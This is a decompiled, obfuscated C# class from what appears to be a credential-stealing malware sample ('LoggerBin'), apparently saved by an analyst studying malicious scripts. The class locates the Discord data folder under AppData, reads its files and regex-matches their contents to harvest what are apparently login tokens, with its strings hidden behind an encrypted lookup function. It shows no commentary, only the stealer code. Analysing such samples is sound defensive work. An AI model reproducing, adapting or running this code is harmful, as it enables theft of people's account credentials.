// Decompiled with JetBrains decompiler
// Type: VJ.vF
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using VW1;

namespace VJ
{
  internal static class vF
  {
    public static string discordPath;
    internal static vF kq;

    public static string PS()
    {
      if (!Convert.ToBoolean(XWr.EnableBrowserRecovery))
        return w4.bx(666, w4.vY);
      if (!Directory.Exists(vF.discordPath))
        return w4.bx(686, w4.vY);
      List<string> stringList = Uh.bx(Uh.eV);
      if (vF.R8((object) stringList) > 0)
        goto label_17;
label_16:
      return w4.bx(934, w4.vY);
label_17:
      using (List<string>.Enumerator enumerator = stringList.GetEnumerator())
      {
        while (enumerator.MoveNext())
        {
          string current = enumerator.Current;
          StringBuilder stringBuilder = new StringBuilder();
          string pattern = w4.bx(716, w4.vY);
          foreach (Match match in Regex.Matches(current, pattern, RegexOptions.IgnoreCase))
            vF.wO((object) stringBuilder, (object) (w4.bx(806, w4.vY) + match.ToString() + w4.bx(822, w4.vY)));
          if (stringBuilder.Length > 0)
          {
            XWr.IsPass = true;
            stringBuilder.AppendLine(w4.bx(828, w4.vY));
            return stringBuilder.ToString();
          }
        }
        int num = 0;
        if (!vF.jQ())
          goto label_13;
label_2:
        switch (num)
        {
          default:
            goto label_16;
        }
label_13:
        num = 0;
        goto label_2;
      }
    }

    private static List<string> Et()
    {
      List<string> stringList = new List<string>();
      if (!Directory.Exists(vF.discordPath))
        return stringList;
      foreach (string file in Directory.GetFiles(vF.discordPath, w4.bx(956, w4.vY), SearchOption.TopDirectoryOnly))
      {
        string str = File.ReadAllText(file);
        if (str.Contains(w4.bx(970, w4.vY)))
          stringList.Add(str);
      }
      return stringList;
    }

    static vF()
    {
      yd.bx(yd.EI);
      vF.discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + w4.bx(982, w4.vY);
    }

    internal static int R8([In] object obj0) => ((List<string>) obj0).Count;

    internal static object wO([In] object obj0, [In] object obj1) => (object) ((StringBuilder) obj0).AppendLine((string) obj1);

    internal static bool jQ() => vF.kq == null;

    internal static vF Gi() => vF.kq;
  }
}
